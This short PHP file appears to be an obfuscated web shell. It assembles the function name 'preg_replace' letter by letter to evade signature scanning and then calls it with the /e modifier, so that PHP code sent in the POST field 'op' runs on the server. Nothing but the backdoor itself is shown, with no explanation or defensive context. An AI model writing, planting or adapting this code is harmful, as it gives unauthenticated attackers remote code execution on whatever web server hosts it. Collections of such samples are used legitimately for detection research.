<?php
    $hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
    $hh("/littlehann/e",$_POST['op'],"111littlehann222"); 
?>